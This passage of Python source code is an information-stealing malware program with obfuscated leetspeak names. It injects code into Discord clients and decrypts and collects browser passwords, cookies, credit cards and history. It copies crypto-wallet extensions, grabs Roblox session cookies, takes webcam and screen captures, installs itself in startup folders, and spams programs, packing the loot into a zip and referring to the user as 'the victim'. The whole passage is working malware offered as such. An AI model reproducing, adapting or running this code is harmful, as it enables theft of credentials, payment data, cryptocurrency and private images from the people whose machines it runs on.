                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def D3f_Inj3ctC0d3():
        v4r_appdata = os.getenv('LOCALAPPDATA')
        v4r_discord_dirs = [
            v4r_appdata + '\\Discord',
            v4r_appdata + '\\DiscordCanary',
            v4r_appdata + '\\DiscordPTB',
            v4r_appdata + '\\DiscordDevelopment'
        ]
        v4r_code = v4r_inj3c710n_c0d3

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for v4r_dir in v4r_discord_dirs:
            if not os.path.exists(v4r_dir):
                continue

            v4r_core_info = D3f_G3tC0r3(v4r_dir)
            if v4r_core_info is not None:
                v4r_core, v4r_core_file = v4r_core_info
                
                v4r_index_js_path = v4r_core + '\\index.js'
                
                if not os.path.exists(v4r_index_js_path):
                    open(v4r_index_js_path, 'w').close()

                with open(v4r_index_js_path, 'w', encoding='utf-8') as f:
                    f.write((v4r_code).replace('discord_desktop_core-1', v4r_core_file)
                            .replace(r"%WEBHOOK_HERE%", v4r_w3bh00k_ur1)
                            .replace(r"%EMBED_COLOR%", str(v4r_color_embed))
                            .replace(r"%USERNAME%", v4r_username_pc)
                            .replace(r"%IP_PUBLIC%", v4r_ip_address_public)
                            .replace(r"%EMBED_NAME%", v4r_username_embed)
                            .replace(r"%EMBED_ICON%", v4r_avatar_embed)
                            .replace(r"%FOOTER_TEXT%", v4r_footer_text)
                            .replace(r"%WEBSITE%", v4r_website))
                D3f_St4rtD15c0rd(v4r_dir)
                
    D3f_Inj3ctC0d3()
    return v4r_number_discord_injection

def D3f_Br0w53r5t341(v4r_zip_file):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

    v4r_browser_choice = ["passwords", "cookies", "history", "cards"]
    v4r_browsers = []

    if "extentions" in v4r_browser_choice:
        v4r_number_extentions = 0
    else:
        v4r_number_extentions = None

    if "passwords" in v4r_browser_choice:
        v4r_file_passwords = []
        v4r_number_passwords = 0
    else:
        v4r_file_passwords = ""
        v4r_number_passwords = None
    if "cookies" in v4r_browser_choice:
        v4r_file_cookies = []
        v4r_number_cookies = 0
    else:
        v4r_file_cookies = ""
        v4r_number_cookies = None
    if "history" in v4r_browser_choice:
        v4r_file_history = []
        v4r_number_history = 0
    else:
        v4r_file_history = ""
        v4r_number_history = None
    if "downloads" in v4r_browser_choice:
        v4r_file_downloads = []
        v4r_number_downloads = 0
    else:
        v4r_file_downloads = ""
        v4r_number_downloads = None
    if "cards" in v4r_browser_choice:
        v4r_file_cards = []
        v4r_number_cards = 0
    else:
        v4r_file_cards = ""
        v4r_number_cards = None
    
    def D3f_GetMasterKey(v4r_path):
        if not os.path.exists(v4r_path):
            return None

        try:
            with open(v4r_path, 'r', encoding='utf-8') as v4r_f:
                v4r_local_state = json.load(v4r_f)

            v4r_encrypted_key = base64.b64decode(v4r_local_state["os_crypt"]["encrypted_key"])[5:]
            v4r_master_key = win32crypt.CryptUnprotectData(v4r_encrypted_key, None, None, None, 0)[1]
            return v4r_master_key
        except:
            return None

    def D3f_Decrypt(v4r_buff, v4r_master_key):
        try:
            v4r_iv = v4r_buff[3:15]
            v4r_payload = v4r_buff[15:-16]
            v4r_tag = v4r_buff[-16:]
            v4r_cipher = Cipher(algorithms.AES(v4r_master_key), modes.GCM(v4r_iv, v4r_tag))
            v4r_decryptor = v4r_cipher.decryptor()
            v4r_decrypted_pass = v4r_decryptor.update(v4r_payload) + v4r_decryptor.finalize()
            return v4r_decrypted_pass.decode()
        except:
            return None
        
    def D3f_GetPasswords(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_passwords
        v4r_password_db = os.path.join(v4r_profile_path, 'Login Data')
        if not os.path.exists(v4r_password_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_password_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url      : {v4r_row[0]}"
            v4r_username =     f"  Username : {v4r_row[1]}"
            v4r_password =     f"  Password : {D3f_Decrypt(v4r_row[2], v4r_master_key)}"
            v4r_browser_name = f"  Browser  : {v4r_browser}"
            v4r_file_passwords.append(f"{v4r_url}\n{v4r_username}\n{v4r_password}\n{v4r_browser_name}\n")
            v4r_number_passwords += 1

        v4r_conn.close()

    def D3f_GetCookies(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cookies
        v4r_cookie_db = os.path.join(v4r_profile_path, 'Network', 'Cookies')
        if not os.path.exists(v4r_cookie_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cookie_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_name =         f"  Name    : {v4r_row[1]}"
            v4r_path =         f"  Path    : {v4r_row[2]}"
            v4r_cookie =       f"  Cookie  : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_expire =       f"  Expire  : {v4r_row[4]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_cookies.append(f"{v4r_url}\n{v4r_name}\n{v4r_path}\n{v4r_cookie}\n{v4r_expire}\n{v4r_browser_name}\n")
            v4r_number_cookies += 1

        v4r_conn.close()

    def D3f_GetHistory(v4r_browser, v4r_profile_path):
        global v4r_number_history
        v4r_history_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_history_db):
            return
        
        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_history_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            v4r_url =          f"- Url     : {v4r_row[0]}"
            v4r_title =        f"  Title   : {v4r_row[1]}"
            v4r_time =         f"  Time    : {v4r_row[2]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_history.append(f"{v4r_url}\n{v4r_title}\n{v4r_time}\n{v4r_browser_name}\n")
            v4r_number_history += 1

        v4r_conn.close()
    
    def D3f_GetDownloads(v4r_browser, v4r_profile_path):
        global v4r_number_downloads
        v4r_downloads_db = os.path.join(v4r_profile_path, 'History')
        if not os.path.exists(v4r_downloads_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_downloads_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in v4r_cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            v4r_path =         f"- Path    : {row[1]}"
            v4r_url =          f"  Url     : {row[0]}"
            v4r_browser_name = f"  Browser : {v4r_browser}"
            v4r_file_downloads.append(f"{v4r_path}\n{v4r_url}\n{v4r_browser_name}\n")
            v4r_number_downloads += 1

        v4r_conn.close()
    
    def D3f_GetCards(v4r_browser, v4r_profile_path, v4r_master_key):
        global v4r_number_cards
        v4r_cards_db = os.path.join(v4r_profile_path, 'Web Data')
        if not os.path.exists(v4r_cards_db):
            return

        v4r_conn = sqlite3.connect(":memory:")
        v4r_disk_conn = sqlite3.connect(v4r_cards_db)
        v4r_disk_conn.backup(v4r_conn)
        v4r_disk_conn.close()
        v4r_cursor = v4r_conn.cursor()
        v4r_cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')

        for v4r_row in v4r_cursor.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            v4r_name =             f"- Name             : {v4r_row[0]}"
            v4r_expiration_month = f"  Expiration Month : {v4r_row[1]}"
            v4r_expiration_year =  f"  Expiration Year  : {v4r_row[2]}"
            v4r_card_number =      f"  Card Number      : {D3f_Decrypt(v4r_row[3], v4r_master_key)}"
            v4r_date_modified =    f"  Date Modified    : {v4r_row[4]}"
            v4r_browser_name =     f"  Browser          : {v4r_browser}"
            v4r_file_cards.append(f"{v4r_name}\n{v4r_expiration_month}\n{v4r_expiration_year}\n{v4r_card_number}\n{v4r_date_modified}\n{v4r_browser_name}\n")
            v4r_number_cards += 1
        
        v4r_conn.close()

    def D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_browser, v4r_profile_path):
        global v4r_number_extentions
        v4r_extensions_path = os.path.join(v4r_profile_path, 'Extensions')
        v4r_zip_folder = os.path.join("Extensions", v4r_browser)

        if not os.path.exists(v4r_extensions_path):
            return 

        v4r_extentions = [v4r_item for v4r_item in os.listdir(v4r_extensions_path) if os.path.isdir(os.path.join(v4r_extensions_path, v4r_item))]
        
        for v4r_extention in v4r_extentions:
            if "Temp" in v4r_extention:
                continue
            
            v4r_number_extentions += 1
            v4r_extension_found = False
            
            for v4r_extension_name, v4r_extension_folder in v4r_extensions_names:
                if v4r_extention == v4r_extension_folder:
                    v4r_extension_found = True
                    
                    v4r_extension_folder_path = os.path.join(v4r_zip_folder, v4r_extension_name, v4r_extention)
                    
                    v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                    for v4r_item in os.listdir(v4r_source_extension_path):
                        v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                        
                        if os.path.isdir(v4r_item_path):
                            for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                                for filename in filenames:
                                    file_path = os.path.join(dirpath, filename)
                                    arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                    v4r_zip_file.write(file_path, os.path.join(v4r_extension_folder_path, arcname))
                        else:
                            v4r_zip_file.write(v4r_item_path, os.path.join(v4r_extension_folder_path, v4r_item))
                    break

            if not v4r_extension_found:
                v4r_other_folder_path = os.path.join(v4r_zip_folder, "Unknown Extension", v4r_extention)
                
                v4r_source_extension_path = os.path.join(v4r_extensions_path, v4r_extention)
                for v4r_item in os.listdir(v4r_source_extension_path):
                    v4r_item_path = os.path.join(v4r_source_extension_path, v4r_item)
                    
                    if os.path.isdir(v4r_item_path):
                        for dirpath, dirnames, filenames in os.walk(v4r_item_path):
                            for filename in filenames:
                                file_path = os.path.join(dirpath, filename)
                                arcname = os.path.relpath(file_path, v4r_source_extension_path)
                                v4r_zip_file.write(file_path, os.path.join(v4r_other_folder_path, arcname))
                    else:
                        v4r_zip_file.write(v4r_item_path, os.path.join(v4r_other_folder_path, v4r_item))

    v4r_browser_files = [
        ("Google Chrome",          os.path.join(v4r_path_appdata_local,   "Google", "Chrome", "User Data"),                 "chrome.exe"),
        ("Google Chrome SxS",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome SxS", "User Data"),             "chrome.exe"),
        ("Google Chrome Beta",     os.path.join(v4r_path_appdata_local,   "Google", "Chrome Beta", "User Data"),            "chrome.exe"),
        ("Google Chrome Dev",      os.path.join(v4r_path_appdata_local,   "Google", "Chrome Dev", "User Data"),             "chrome.exe"),
        ("Google Chrome Unstable", os.path.join(v4r_path_appdata_local,   "Google", "Chrome Unstable", "User Data"),        "chrome.exe"),
        ("Google Chrome Canary",   os.path.join(v4r_path_appdata_local,   "Google", "Chrome Canary", "User Data"),          "chrome.exe"),
        ("Microsoft Edge",         os.path.join(v4r_path_appdata_local,   "Microsoft", "Edge", "User Data"),                "msedge.exe"),
        ("Opera",                  os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Stable"),                "opera.exe"),
        ("Opera GX",               os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera GX Stable"),             "opera.exe"),
        ("Opera Neon",             os.path.join(v4r_path_appdata_roaming, "Opera Software", "Opera Neon"),                  "opera.exe"),
        ("Brave",                  os.path.join(v4r_path_appdata_local,   "BraveSoftware", "Brave-Browser", "User Data"),   "brave.exe"),
        ("Vivaldi",                os.path.join(v4r_path_appdata_local,   "Vivaldi", "User Data"),                          "vivaldi.exe"),
        ("Internet Explorer",      os.path.join(v4r_path_appdata_local,   "Microsoft", "Internet Explorer"),                "iexplore.exe"),
        ("Amigo",                  os.path.join(v4r_path_appdata_local,   "Amigo", "User Data"),                            "amigo.exe"),
        ("Torch",                  os.path.join(v4r_path_appdata_local,   "Torch", "User Data"),                            "torch.exe"),
        ("Kometa",                 os.path.join(v4r_path_appdata_local,   "Kometa", "User Data"),                           "kometa.exe"),
        ("Orbitum",                os.path.join(v4r_path_appdata_local,   "Orbitum", "User Data"),                          "orbitum.exe"),
        ("Cent Browser",           os.path.join(v4r_path_appdata_local,   "CentBrowser", "User Data"),                      "centbrowser.exe"),
        ("7Star",                  os.path.join(v4r_path_appdata_local,   "7Star", "7Star", "User Data"),                   "7star.exe"),
        ("Sputnik",                os.path.join(v4r_path_appdata_local,   "Sputnik", "Sputnik", "User Data"),               "sputnik.exe"),
        ("Epic Privacy Browser",   os.path.join(v4r_path_appdata_local,   "Epic Privacy Browser", "User Data"),             "epic.exe"),
        ("Uran",                   os.path.join(v4r_path_appdata_local,   "uCozMedia", "Uran", "User Data"),                "uran.exe"),
        ("Yandex",                 os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowser", "User Data"),          "yandex.exe"),
        ("Yandex Canary",          os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserCanary", "User Data"),    "yandex.exe"),
        ("Yandex Developer",       os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserDeveloper", "User Data"), "yandex.exe"),
        ("Yandex Beta",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserBeta", "User Data"),      "yandex.exe"),
        ("Yandex Tech",            os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserTech", "User Data"),      "yandex.exe"),
        ("Yandex SxS",             os.path.join(v4r_path_appdata_local,   "Yandex", "YandexBrowserSxS", "User Data"),       "yandex.exe"),
        ("Iridium",                os.path.join(v4r_path_appdata_local,   "Iridium", "User Data"),                          "iridium.exe"),
        ("Mozilla Firefox",        os.path.join(v4r_path_appdata_roaming, "Mozilla", "Firefox", "Profiles"),                "firefox.exe"),
        ("Safari",                 os.path.join(v4r_path_appdata_roaming, "Apple Computer", "Safari"),                      "safari.exe"),
    ]

    v4r_profiles = [
        '', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5'
    ]

    v4r_extensions_names = [
        ("Metamask",        "nkbihfbeogaeaoehlefnkodbefgpgknn"),
        ("Metamask",        "ejbalbakoplchlghecdalmeeeajnimhm"),
        ("Binance",         "fhbohimaelbohpjbbldcngcnapndodjp"),
        ("Coinbase",        "hnfanknocfeofbddgcijnmhnfnkdnaad"),
        ("Ronin",           "fnjhmkhhmkbjkkabndcnnogagogbneec"),
        ("Trust",           "egjidjbpglichdcondbcbdnbeeppgdph"),
        ("Venom",           "ojggmchlghnjlapmfbnjholfjkiidbch"),
        ("Sui",             "opcgpfmipidbgpenhmajoajpbobppdil"),
        ("Martian",         "efbglgofoippbgcjepnhiblaibcnclgk"),
        ("Tron",            "ibnejdfjmmkpcnlpebklmnkoeoihofec"),
        ("Petra",           "ejjladinnckdgjemekebdpeokbikhfci"),
        ("Pontem",          "phkbamefinggmakgklpkljjmgibohnba"),
        ("Fewcha",          "ebfidpplhabeedpnhjnobghokpiioolj"),
        ("Math",            "afbcbjpbpfadlkmhmclhkeeodmamcflc"),
        ("Coin98",          "aeachknmefphepccionboohckonoeemg"),
        ("Authenticator",   "bhghoamapcdpbohphigoooaddinpkbai"),
        ("ExodusWeb3",      "aholpfdialjgjfhomihkjbmgjidlcdno"),
        ("Phantom",         "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
        ("Core",            "agoakfejjabomempkjlepdflaleeobhb"),
        ("Tokenpocket",     "mfgccjchihfkkindfppnaooecgfneiii"),
        ("Safepal",         "lgmpcpglpngdoalbgeoldeajfclnhafa"),
        ("Solfare",         "bhhhlbepdkbapadjdnnojkbgioiodbic"),
        ("Kaikas",          "jblndlipeogpafnldhgmapagcccfchpi"),
        ("iWallet",         "kncchdigobghenbbaddojjnnaogfppfj"),
        ("Yoroi",           "ffnbelfdoeiohenkjibnmadjiehjhajb"),
        ("Guarda",          "hpglfhgfnhbgpjdenjgmdgoeiappafln"),
        ("Jaxx Liberty",    "cjelfplplebdjjenllpjcblmjkfcffne"),
        ("Wombat",          "amkmjjmmflddogmhpjloimipbofnfjih"),
        ("Oxygen",          "fhilaheimglignddkjgofkcbgekhenbh"),
        ("MEWCX",           "nlbmnnijcnlegkjjpcfjclmcfggfefdm"),
        ("Guild",           "nanjmdknhkinifnkgdcggcfnhdaammmj"),
        ("Saturn",          "nkddgncdjgjfcddamfgcmfnlhccnimig"),
        ("TerraStation",    "aiifbnbfobpmeekipheeijimdpnlpgpp"),
        ("HarmonyOutdated", "fnnegphlobjdpkhecapkijjdkgcjhkib"),
        ("Ever",            "cgeeodpfagjceefieflmdfphplkenlfk"),
        ("KardiaChain",     "pdadjkfkgcafgbceimcpbkalnfnepbnk"),
        ("PaliWallet",      "mgffkfbidihjpoaomajlbgchddlicgpn"),
        ("BoltX",           "aodkkagnadcbobfpggfnjeongemjbjca"),
        ("Liquality",       "kpfopkelmapcoipemfendmdcghnegimn"),
        ("XDEFI",           "hmeobnfnfcmdkdcmlblgagmfpfboieaf"),
        ("Nami",            "lpfcbjknijpeeillifnkikgncikgfhdo"),
        ("MaiarDEFI",       "dngmlblcodfobpdpecaadgfbcggfjfnm"),
        ("TempleTezos",     "ookjlbkiijinhpmnjffcofjonbfbgaoc"),
        ("XMR.PT",          "eigblbgjknlfbajkfhopmcojidlgcehm")
    ]
    
    try:
        for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
            for v4r_proc in psutil.process_iter(['pid', 'name']):
                try:
                    if v4r_proc.name().lower() == v4r_proc_name.lower():
                        v4r_proc.terminate()
                except:
                    pass
    except:
        pass

    for v4r_name, v4r_path, v4r_proc_name in v4r_browser_files:
        if not os.path.exists(v4r_path):
            continue

        v4r_master_key = D3f_GetMasterKey(os.path.join(v4r_path, 'Local State'))
        if not v4r_master_key:
            continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue

        for v4r_profile in v4r_profiles:
            v4r_profile_path = os.path.join(v4r_path, v4r_profile)
            if not os.path.exists(v4r_profile_path):
                continue
            
            if "extentions" in v4r_browser_choice:
                try: D3f_GetExtentions(v4r_zip_file, v4r_extensions_names, v4r_name, v4r_profile_path)
                except: pass
                
            if "passwords" in v4r_browser_choice:
                try: D3f_GetPasswords(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "cookies" in v4r_browser_choice:
                try: D3f_GetCookies(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass
            if "history" in v4r_browser_choice:
                try: D3f_GetHistory(v4r_name, v4r_profile_path)
                except: pass
            if "downloads" in v4r_browser_choice:
                try: D3f_GetDownloads(v4r_name, v4r_profile_path)
                except: pass
            if "cards" in v4r_browser_choice:
                try: D3f_GetCards(v4r_name, v4r_profile_path, v4r_master_key)
                except: pass

            if v4r_name not in v4r_browsers:
                v4r_browsers.append(v4r_name)

    if "passwords" in v4r_browser_choice:
        if not v4r_file_passwords:
            v4r_file_passwords.append("No passwords was saved on the victim's computer.")
        v4r_file_passwords = "\n".join(v4r_file_passwords)
    if "cookies" in v4r_browser_choice:
        if not v4r_file_cookies:
            v4r_file_cookies.append("No cookies was saved on the victim's computer.")
        v4r_file_cookies   = "\n".join(v4r_file_cookies)
    if "history" in v4r_browser_choice:
        if not v4r_file_history:
            v4r_file_history.append("No history was saved on the victim's computer.")
        v4r_file_history   = "\n".join(v4r_file_history)
    if "downloads" in v4r_browser_choice:
        if not v4r_file_downloads:
            v4r_file_downloads.append("No downloads was saved on the victim's computer.")
        v4r_file_downloads = "\n".join(v4r_file_downloads)
    if "cards" in v4r_browser_choice:
        if not v4r_file_cards:
            v4r_file_cards.append("No cards was saved on the victim's computer.")
        v4r_file_cards     = "\n".join(v4r_file_cards)
    
    if v4r_number_passwords != None:
        v4r_zip_file.writestr(f"Passwords ({v4r_number_passwords}).txt", v4r_file_passwords)

    if v4r_number_cookies != None:
        v4r_zip_file.writestr(f"Cookies ({v4r_number_cookies}).txt", v4r_file_cookies)

    if v4r_number_cards != None:
        v4r_zip_file.writestr(f"Cards ({v4r_number_cards}).txt", v4r_file_cards)

    if v4r_number_history != None:
        v4r_zip_file.writestr(f"Browsing History ({v4r_number_history}).txt", v4r_file_history)

    if v4r_number_downloads != None:
        v4r_zip_file.writestr(f"Download History ({v4r_number_downloads}).txt",v4r_file_downloads)

    return v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards

def D3f_R0b10xAccount(v4r_zip_file):
    import browser_cookie3
    import requests
    import json

    v4r_file_roblox_account = ""
    v4r_number_roblox_account = 0
    v4r_c00ki35_list = []
    

    def D3f_G3tC00ki34ndN4vig4t0r(v4r_br0ws3r_functi0n):
        try:
            v4r_c00kie5 = v4r_br0ws3r_functi0n()
            v4r_c00kie5 = str(v4r_c00kie5)
            v4r_c00kie = v4r_c00kie5.split(".ROBLOSECURITY=")[1].split(" for .roblox.com/>")[0].strip()
            v4r_n4vigator = v4r_br0ws3r_functi0n.__name__
            return v4r_c00kie, v4r_n4vigator
        except:
            return None, None

    def MicrosoftEdge():
        return browser_cookie3.edge(domain_name="roblox.com")

    def GoogleChrome():
        return browser_cookie3.chrome(domain_name="roblox.com")

    def Firefox():
        return browser_cookie3.firefox(domain_name="roblox.com")

    def Opera():
        return browser_cookie3.opera(domain_name="roblox.com")
    
    def OperaGX():
        return browser_cookie3.opera_gx(domain_name="roblox.com")

    def Safari():
        return browser_cookie3.safari(domain_name="roblox.com")

    def Brave():
        return browser_cookie3.brave(domain_name="roblox.com")

    v4r_br0ws3r5 = [MicrosoftEdge, GoogleChrome, Firefox, Opera, OperaGX, Safari, Brave]
    for v4r_br0ws3r in v4r_br0ws3r5:
        v4r_c00ki3, v4r_n4vigator = D3f_G3tC00ki34ndN4vig4t0r(v4r_br0ws3r)
        if v4r_c00ki3:
            if v4r_c00ki3 not in v4r_c00ki35_list:
                v4r_number_roblox_account += 1
                v4r_c00ki35_list.append(v4r_c00ki3)
                try:
                    v4r_inf0 = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": v4r_c00ki3})
                    v4r_api = json.loads(v4r_inf0.text)
                except:
                    v4r_api = {"None": "None"}

                v4r_us3r_1d_r0b10x = v4r_api.get('id', "None")
                v4r_d1spl4y_nam3_r0b10x = v4r_api.get('displayName', "None")
                v4r_us3rn4m3_r0b10x = v4r_api.get('name', "None")
                v4r_r0bux_r0b10x = v4r_api.get("RobuxBalance", "None")
                v4r_pr3mium_r0b10x = v4r_api.get("IsPremium", "None")
                v4r_av4t4r_r0b10x = v4r_api.get("ThumbnailUrl", "None")
                v4r_bui1d3r5_c1ub_r0b10x = v4r_api.get("IsAnyBuildersClubMember", "None")
                
                v4r_file_roblox_account = v4r_file_roblox_account + f"""
Roblox Account n°{str(v4r_number_roblox_account)}:
 - Navigator     : {v4r_n4vigator}
 - Username      : {v4r_us3rn4m3_r0b10x}
 - DisplayName   : {v4r_d1spl4y_nam3_r0b10x}
 - Id            : {v4r_us3r_1d_r0b10x}
 - Avatar        : {v4r_av4t4r_r0b10x}
 - Robux         : {v4r_r0bux_r0b10x}
 - Premium       : {v4r_pr3mium_r0b10x}
 - Builders Club : {v4r_bui1d3r5_c1ub_r0b10x}
 - Cookie        : {v4r_c00ki3}
"""
                
    if not v4r_c00ki35_list:
        v4r_file_roblox_account = "No roblox cookie found."
        
    v4r_zip_file.writestr(f"Roblox Accounts ({v4r_number_roblox_account}).txt", v4r_file_roblox_account)

    return v4r_number_roblox_account

def D3f_W3bc4m(v4r_zip_file):
    import cv2
    import io
    from PIL import Image

    try:
        v4r_status_camera_capture = "Yes"
        v4r_cap = cv2.VideoCapture(0)

        if not v4r_cap.isOpened():
            v4r_status_camera_capture = "No webcam found."
            return v4r_status_camera_capture

        v4r_ret, v4r_frame = v4r_cap.read()
        v4r_cap.release()

        if not v4r_ret:
            v4r_status_camera_capture = "Failed to capture image."
            D3f_Clear()
            return v4r_status_camera_capture

        v4r_frame_rgb = cv2.cvtColor(v4r_frame, cv2.COLOR_BGR2RGB)
        v4r_img_pil = Image.fromarray(v4r_frame_rgb)
        v4r_img_bytes = io.BytesIO()
        v4r_img_pil.save(v4r_img_bytes, format='PNG')
        v4r_img_bytes.seek(0)
        v4r_zip_file.writestr("Webcam.png", v4r_img_bytes.read())

        return v4r_status_camera_capture

    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"
        return v4r_status_camera_capture

def D3f_Scr33n5h0t(zip_file):
    import io
    from PIL import ImageGrab

    try:
        v4r_number_screenshot = "Yes"

        def C4ptur3():
            v4r_image = ImageGrab.grab(
                bbox=None,
                include_layered_windows=False,
                all_screens=True,
                xdisplay=None
            )
            v4r_image_bytes = io.BytesIO()
            v4r_image.save(v4r_image_bytes, format='PNG')
            v4r_image_bytes.seek(0)
            return v4r_image_bytes

        v4r_image_bytes = C4ptur3()
        zip_file.writestr("Screenshot.png", v4r_image_bytes.read())
        return v4r_number_screenshot
    except Exception as e:
        v4r_number_screenshot = f"Error: {e}"
        return v4r_number_screenshot

def D3f_Sp4m0p3nPr0gr4m():
    import subprocess
    import threading

    def D3f_Sp4m():
        programs = [
            'calc.exe',
            'notepad.exe',
            'mspaint.exe',
            'explorer.exe',    
        ]
        for program in programs:
            for _ in range(1):
                subprocess.Popen(program)
    
    def D3f_Request():
        threads = []
        try:
            for _ in range(int(100)):
                t = threading.Thread(target=D3f_Sp4m)
                t.start()
                threads.append(t)
        except:
            pass

        for thread in threads:
            thread.join()

    D3f_Request()

def St4rtup():
    import os
    import sys
    import shutil

    try:
        v4r_file_path = os.path.abspath(sys.argv[0])

        if v4r_file_path.endswith(".exe"):
            v4r_ext = "exe"
        elif v4r_file_path.endswith(".py"):
            v4r_ext = "py"

        v4r_new_name = f"ㅤ.{v4r_ext}"

        if sys.platform.startswith('win'):  
            v4r_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        elif sys.platform.startswith('darwin'): 
            v4r_folder = os.path.join(os.path.expanduser('~'), 'Library', 'LaunchAgents')
        elif sys.platform.startswith('linux'):
            v4r_folder = os.path.join(os.path.expanduser('~'), '.config', 'autostart')
        v4r_path_new_file = os.path.join(v4r_folder, v4r_new_name)

        shutil.copy(v4r_file_path, v4r_path_new_file)
        os.chmod(v4r_path_new_file, 0o777) 
    except:
        pass

def D3f_Sp4mOpti0ns():
    import keyboard
    while True:
        try:
            D3f_B10ckM0u53()
            D3f_Sp4m0p3nPr0gr4m()
            D3f_Sp4mCr34tFil3()
            if keyboard.is_pressed('alt') and keyboard.is_pressed('alt gr'):
                Unb10ck_K3y()
                break
        except:
            pass

v4r_option = []

v4r_zip_buffer = io.BytesIO()
with zipfile.ZipFile(v4r_zip_buffer, "w", zipfile.ZIP_DEFLATED) as v4r_zip_file:

    try: 
        v4r_number_discord_injection = D3f_Di5c0rdInj3c710n()
    except Exception as e:
        v4r_number_discord_injection = f"Error: {e}"

    try: 
        v4r_status_system_info = D3f_Sy5t3mInf0(v4r_zip_file)
    except Exception as e:
        v4r_status_system_info = f"Error: {e}"

    try: 
        v4r_number_discord_account = D3f_Di5c0rdAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_discord_account = f"Error: {e}"

    try: 
        v4r_number_extentions, v4r_number_passwords, v4r_number_cookies, v4r_number_history, v4r_number_downloads, v4r_number_cards = D3f_Br0w53r5t341(v4r_zip_file)
    except Exception as e:
        v4r_number_extentions = f"Error: {e}"
        v4r_number_passwords = f"Error: {e}"
        v4r_number_cookies = f"Error: {e}"
        v4r_number_history = f"Error: {e}"
        v4r_number_downloads = f"Error: {e}"
        v4r_number_cards = f"Error: {e}"

    try: 
        v4r_number_roblox_account = D3f_R0b10xAccount(v4r_zip_file)
    except Exception as e:
        v4r_number_roblox_account = f"Error: {e}"

    try: 
        v4r_status_camera_capture = D3f_W3bc4m(v4r_zip_file)
    except Exception as e:
        v4r_status_camera_capture = f"Error: {e}"

    try: 
        v4r_status_screenshot = D3f_Scr33n5h0t(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_name_wallets, v4r_name_game_launchers, v4r_name_apps = D3f_S3ssi0nFil3s(v4r_zip_file)
    except Exception as e:
        v4r_status_screenshot = f"Error: {e}"

    try: 
        v4r_number_files = D3f_Int3r3stingFil3s(v4r_zip_file)
    except Exception as e:
        v4r_number_files = f"Error: {e}"

    if v4r_number_discord_injection != None:
        v4r_option.append(f"Discord Injection : {v4r_number_discord_injection}")

    if v4r_status_camera_capture != None:
        v4r_option.append(f"Camera Capture    : {v4r_status_camera_capture}")

